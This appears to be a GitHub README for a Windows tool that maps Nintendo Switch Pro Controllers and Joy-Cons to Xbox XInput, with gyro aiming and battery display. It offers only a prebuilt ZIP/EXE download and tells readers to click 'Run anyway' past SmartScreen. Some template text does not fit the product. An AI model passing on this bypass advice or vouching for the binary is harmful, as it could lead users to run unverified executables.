<p align="center">
  <img src="https://i.postimg.cc/7YQfGTgb/banner.png" alt="SwitchPro PC Input Bridge — Nintendo Switch Pro & Joy-Con XInput + Gyro for Windows" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Switch%20Pro%20%26%20Joy-Con%20PC-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-switchpro--pc--v1.2-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# SwitchPro PC Input Bridge — Nintendo Switch Pro & Joy-Con XInput + Gyro for Windows

**Connecting a Nintendo Switch Pro Controller or Joy-Cons to Windows PC and finding that non-Steam games (Game Pass, Epic, emulators, indie titles) ignore it or scramble A/B and X/Y buttons? Bridge Nintendo HID to clean Xbox XInput with gyro-to-mouse and tray battery %.**

SwitchPro PC Input Bridge translates Nintendo Switch Pro Controller (`VID_057E&PID_2009`) and paired Joy-Cons (`PID_2006`/`2007`) into standard Windows XInput: **combining Left + Right Joy-Cons into one virtual gamepad, offering optional A↔B / X↔Y layout swap, gyro-to-mouse aiming, and live tray battery readout**.

This project is aimed at **Windows 10 and Windows 11 (64-bit) PC gamers** using Nintendo Switch Pro Controllers or Joy-Cons across Xbox Game Pass, Epic Games, GOG, and Steam.

## Quick Use-Case & Troubleshooting Reference

| Scenario / Issue | Cause | Solution |
| --- | --- | --- |
| Xbox Game Pass & Epic games ignore Switch Pro Controller over Bluetooth | Windows sees Nintendo controllers as raw DirectInput instead of XInput | Translate Nintendo HID reports to a native virtual Xbox 360 XInput pad |
| Left and Right Joy-Cons show up as two separate half-controllers | Windows pairs Joy-Con (L) and Joy-Con (R) as independent Bluetooth devices | Combine **Joy-Con L + R** into a single unified XInput controller |
| Want Splatoon/Zelda-style motion gyro aiming in PC shooters & bows | Standard XInput has no gyroscope axis | Map controller **IMU Gyroscope** to smooth mouse movement while holding `ZL` |
| Blue Home-button ring stays glowing and controller battery level is hidden | Windows does not expose Nintendo battery telemetry by default | Show exact battery status in tray and turn off or dim the Home LED ring |

## Download for Windows

[**Download SwitchProPC.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/SwitchProPC.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why use `SwitchProPC.exe`? (Key features)

- Translates **Switch Pro Controller** and **Combined Left + Right Joy-Cons** into standard XInput for all PC games.
- One-click **Nintendo Layout (A/B, X/Y)** vs. **Xbox Position Layout** button swap.
- Optional **Gyro-to-Mouse Aim** activated on `ZL` left-trigger hold (or toggle hotkey) with sensitivity & deadzone sliders.
- Displays live battery status in the system tray and disables the distracting blue Home LED ring.

### Sample Output

```text
[SwitchProPC] Connected: Nintendo Switch Pro Controller (Bluetooth HID)
[OK]   XInput Bridge    : Virtual Xbox 360 Pad [Slot 1] Active | Button Map: Xbox Positions
[OK]   Battery & LED    : Battery Level: High (88%) | Home Ring LED: OFF
[INFO] Gyro Aiming      : Enabled on ZL Hold (Sensitivity: 1.4x | Smoothing: Low)
```

The release ZIP is named `SwitchProPC.zip`; the Windows executable inside is named `SwitchProPC.exe`.

1. Close SwitchPro PC before updating or replacing executable files.
2. Click **Download SwitchProPC.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `SwitchProPC.exe`.
5. Review the options and output paths before processing files.

**Requirements:** Windows 10 or 11 (64-bit) with ViGEmBus driver and a Switch Pro Controller or Joy-Cons (USB-C or Bluetooth).

### Verification & Windows SmartScreen Note

- **Offline & standard user permissions:** `SwitchProPC.exe` runs locally without uploading your personal files and does not require disabling Windows Defender.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project solves

### Full compatibility with Xbox Game Pass, Epic, and GOG games

XInput emulation makes every PC game recognize your Switch controller immediately.

### Unified Left + Right Joy-Con pairing

Plays dual Joy-Cons seamlessly as one full-featured controller.

### Precision gyro-to-mouse aiming on PC

Brings console motion-aim precision to PC shooters and archery games.

### Eliminating the bright blue Home ring LED

Turns off the constant blue ring light when connected to Windows.

## Default folders and configuration paths

SwitchPro PC stores controller calibration and gyro profiles in `%APPDATA%\SwitchProPC`:

```text
%APPDATA%\SwitchProPC\config.json
```

Typical directory layout:

```text
Switch Pro / Joy-Cons (USB-C or Bluetooth HID)
        │
        ▼
[SwitchProPC.exe] -> Calibration + Optional Gyro-to-Mouse
        │
        ▼
Virtual XInput Controller (Works in Game Pass, Epic, Steam, Emulators)
```

If using Steam alongside SwitchPro PC, turn off **Nintendo Switch Configuration Support** in Steam Controller Settings so Steam and SwitchPro PC don't double-input.

## Quick start guide

Follow these steps to get started:

1. **Pair your Switch Pro Controller or Joy-Cons via Windows Bluetooth (or plug in USB-C).** Extract `SwitchProPC.zip` and launch `SwitchProPC.exe`.
2. **Choose **Xbox Button Positions** or **Nintendo A/B Labels**.** Optionally enable **Gyro-to-Mouse on ZL Hold** and calibrate flat on desk for 2 seconds.
3. **Launch any PC game and play with full XInput & rumble support.** Right-click the tray icon anytime to disconnect or check battery.

### Data safety note

SwitchPro PC uses standard user-mode HID and ViGEmBus XInput interfaces.

## What the status summary shows

SwitchPro PC displays **connected Nintendo devices, XInput slot index, battery state, Home LED state, and gyro mode**.

## FAQ

**Can I use two Joy-Cons together as one controller on PC?**

Yes—pair both Joy-Con (L) and Joy-Con (R) in Windows Bluetooth and SwitchPro PC automatically combines them into one XInput gamepad.

**Why do I get double button presses in Steam games?**

Disable 'Switch Pro Configuration Support' inside Steam's Controller settings when SwitchPro PC is running, or exit SwitchPro PC when using Steam Input.

**Does gyro aiming work in any PC game?**

Yes—because gyro translates to standard mouse delta input, it works in any game that supports simultaneous gamepad + mouse.

## Useful reading

- [PCGamingWiki — Controller: Nintendo Switch Pro Controller](https://www.pcgamingwiki.com/wiki/Controller:Nintendo_Switch_Pro_Controller)

## More Windows Gaming Utilities

- [DualSensePC-ControllerGlyphBridge](../DualSensePC-ControllerGlyphBridge) — PlayStation DualSense tray battery %, lightbar RGB & trigger tool
- [Xbox360Pad-XInputEmulator](../Xbox360Pad-XInputEmulator) — Universal DirectInput & USB gamepad to Xbox 360 XInput mapper
- [PadDrift-ControllerPollingTest](../PadDrift-ControllerPollingTest) — Gamepad stick drift & mouse polling rate (1000-8000 Hz) tester
- [AudioSwitch-HotkeyToggle](../AudioSwitch-HotkeyToggle) — One-key headphones, speakers & microphone switcher

*Independent open-source desktop utility for Windows. Not affiliated with Nintendo Co., Ltd. or Microsoft.*
